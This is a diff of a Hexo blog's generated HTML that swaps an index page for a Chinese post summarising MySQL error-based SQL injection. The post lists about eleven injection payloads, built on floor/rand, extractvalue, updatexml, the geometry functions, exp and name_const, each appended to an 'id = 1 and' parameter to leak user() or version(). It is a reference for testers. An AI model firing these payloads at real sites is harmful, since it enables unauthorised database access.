@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://www.lovebear.top">
-  <title>Blog for You</title>
+  <title>Mysql 报错注入总结 | Blog for You</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog for You">
-<meta property="og:url" content="http://www.lovebear.top/page/3/index.html">
+  <meta name="description" content="一、前言总结Mysql中的报错注入函数，及其注入方式示例，目前方式有十余种。">
+<meta name="keywords" content="Vulnerability">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql 报错注入总结">
+<meta property="og:url" content="http://www.lovebear.top/2020/02/20/Mysql_Error_Inject/index.html">
 <meta property="og:site_name" content="Blog for You">
+<meta property="og:description" content="一、前言总结Mysql中的报错注入函数，及其注入方式示例，目前方式有十余种。">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-02-20T06:10:57.241Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Blog for You">
+<meta name="twitter:title" content="Mysql 报错注入总结">
+<meta name="twitter:description" content="一、前言总结Mysql中的报错注入函数，及其注入方式示例，目前方式有十余种。">
   
     <link rel="alternative" href="/atom.xml" title="Blog for You" type="application/atom+xml">
   
@@ -174,32 +179,126 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Hexo-Table-Style" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+            <article id="post-Mysql_Error_Inject" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/20/Hexo-Table-Style/">Hexo表格美化</a>
+    <h1 class="article-title" itemprop="name">
+      Mysql 报错注入总结
     </h1>
   
 
-        <a href="/2019/12/20/Hexo-Table-Style/" class="archive-article-date">
-  	<time datetime="2019-12-20T15:04:09.745Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-20</time>
+        <a href="/2020/02/20/Mysql_Error_Inject/" class="archive-article-date">
+  	<time datetime="2020-02-20T05:45:52.918Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-20</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Hexo使用markdown进行编写，但是md自带的表格样式较为简单，而且不支持自定义，这里，<br>可以通过css的方式，使hexo生成的表格可以自定义美化，主要利用了markdown中可以嵌入<br>style标签，用css来对其进行美化。</p>
-        
-          <a class="article-more-a" href="/2019/12/20/Hexo-Table-Style/#more">more >></a>
-        
+        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>总结Mysql中的报错注入函数，及其注入方式示例，目前方式有十余种。</p>
+<a id="more"></a>
+<h2 id="二、注入函数"><a href="#二、注入函数" class="headerlink" title="二、注入函数"></a>二、注入函数</h2><ul>
+<li>floor()</li>
+</ul>
+<pre><code>id = 1 and (
+SELECT 1
+FROM (
+  SELECT COUNT(*), concat(user(), floor(rand(0) * 2)) AS x
+  FROM information_schema.tables
+  GROUP BY x
+) a
+)
+</code></pre><ul>
+<li>extractvalue()</li>
+</ul>
+<pre><code>id = 1 and (
+extractvalue(1,concat(0x5c,(select user())))
+)
+</code></pre><ul>
+<li>updatexml()</li>
+</ul>
+<pre><code>id = 1 and (
+  updatexml(1,concat(0x5e24,(select user()),0x5e24),1)
+)
+</code></pre><ul>
+<li>geometrycollection()</li>
+</ul>
+<pre><code>id = 1 and (
+  geometrycollection((select * from(select * from(select user())a)b))
+)
+</code></pre><ul>
+<li>polygon()</li>
+</ul>
+<pre><code>id = 1 and (
+  polygon((select * from(select * from(select user())a)b))
+)
+</code></pre><ul>
+<li>multipoint()</li>
+</ul>
+<pre><code>id = 1 and (
+  multipoint((select * from(select * from(select user())a)b))
+)
+</code></pre><ul>
+<li>multilinestring()</li>
+</ul>
+<pre><code>id = 1 and (
+  multilinestring((select * from(select * from(select user())a)b))
+)
+</code></pre><ul>
+<li>multipolygon()</li>
+</ul>
+<pre><code>id = 1 and (
+  multipolygon((select * from(select * from(select user())a)b))
+)
+</code></pre><ul>
+<li>linestring()</li>
+</ul>
+<pre><code>id = 1 and (
+  linestring((select * from(select * from(select user())a)b))
+)
+</code></pre><ul>
+<li>exp()</li>
+</ul>
+<pre><code>id = 1 and (
+  exp(~(select * from (select user())a))
+)
+</code></pre><ul>
+<li>name_const()</li>
+</ul>
+<pre><code>id = 1 and (
+  select * from (select name_const(version(),1),name_const(version(),1)) a
+)
+</code></pre>
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://lovebear.top/img/url_zhifubao.JPG">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -207,246 +306,112 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnerability/">Vulnerability</a></li></ul>
 	</div>
 
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/20/Hexo-Table-Style/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://www.lovebear.top/2020/02/20/Mysql_Error_Inject/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
 
-
-
-
-
   
-    <article id="post-Hexo-Yilia-Valine" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/15/Hexo-Yilia-Valine/">Hexo的Yilia主题配置Valine评论功能</a>
-    </h1>
   
+    <a href="/2020/02/16/PowerShell_15_Ways_Bypass_ExecutionPolicy/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">绕过PowerShell 执行策略的15种方法</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        <a href="/2019/12/15/Hexo-Yilia-Valine/" class="archive-article-date">
-  	<time datetime="2019-12-15T05:25:32.615Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-15</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p><a href="http://lovebear.top/2016/10/08/Hexo-Your-Blog/" target="_blank" rel="noopener">Hexo Your Blog</a>教我们搭建自己的Hexo博客，使用的主题是Yilia。<br>由于多说等Yilia自兼容的评论系统已经跑路，所以选择为其配置Valine来满足需求。</p>
-        
-          <a class="article-more-a" href="/2019/12/15/Hexo-Yilia-Valine/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/15/Hexo-Yilia-Valine/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
 
 
 
 
 
   
-    <article id="post-Hexo_Coding_BaiduSpider" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:rgb(255, 255, 255)}
+        @media screen and (max-width:400px){.comments{margin:auto;padding:10px;background:rgb(214, 252, 203)}}
+      </style>
+      <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'false' == true ? true : false;
+    var verify = 'false' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "J3JcKBL0IxtN9XJWzPrnegcB-gzGzoHsz",
+        app_key: "ewqKho2b8ByxHacJAjmvq5ur",
+        placeholder: "请留下宝贵的评论",
+        avatar:"retro",
+    });
+</script>
+
+    </section>
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/09/Hexo_Coding_BaiduSpider/">Hexo进行Coding Page分流，实现百度爬虫收录</a>
-    </h1>
-  
-
-        <a href="/2019/12/09/Hexo_Coding_BaiduSpider/" class="archive-article-date">
-  	<time datetime="2019-12-09T06:57:24.546Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-09</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Hexo + GitPage服务搭建个人博客已经非常流行，搭建方法详见 <a href="http://lovebear.top/2016/10/08/Hexo-Your-Blog/" target="_blank" rel="noopener">Hexo Your Blog</a>,<br>但是由于github限制了百度的爬虫抓取，所以git page搭建的博客不会被百度爬取收录，<br>为了使百度收录我们的blog，分享更多的知识给大家，特查询总结了Coding Page进行分流<br>的方法来实现百度爬虫收录。</p>
-        
-          <a class="article-more-a" href="/2019/12/09/Hexo_Coding_BaiduSpider/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/">Hexo</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/09/Hexo_Coding_BaiduSpider/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-Spark-HadoopYarn-Kafka_Kafka" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/08/Spark-HadoopYarn-Kafka_Kafka/">Spark-HadoopYarn-Kafka集群搭建--搭建Kafka集群</a>
-    </h1>
-  
-
-        <a href="/2019/12/08/Spark-HadoopYarn-Kafka_Kafka/" class="archive-article-date">
-  	<time datetime="2019-12-08T05:01:36.141Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-08</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最后，是Kafka集群的搭建，包括，配置zookeeper，配置Kafka，启动Kafka集群，<br>查看是否启动成功和关闭集群，还有关于提高性能的一些建议。</p>
-        
-          <a class="article-more-a" href="/2019/12/08/Spark-HadoopYarn-Kafka_Kafka/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/大数据/">大数据</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/08/Spark-HadoopYarn-Kafka_Kafka/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-Spark-HadoopYarn-Kafka_Spark" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/08/Spark-HadoopYarn-Kafka_Spark/">Spark-HadoopYarn-Kafka集群搭建--搭建Spark集群</a>
-    </h1>
-  
-
-        <a href="/2019/12/08/Spark-HadoopYarn-Kafka_Spark/" class="archive-article-date">
-  	<time datetime="2019-12-08T04:52:34.752Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-08</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>然后，是Spark集群的搭建，包括，添加环境变量，修改相应的配置文件，启动Spark集群，<br>查看是否启动成功和关闭集群。</p>
-        
-          <a class="article-more-a" href="/2019/12/08/Spark-HadoopYarn-Kafka_Spark/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/大数据/">大数据</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/08/Spark-HadoopYarn-Kafka_Spark/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
-    </nav>
-  
-
 
           </div>
         </div>
@@ -486,8 +451,8 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
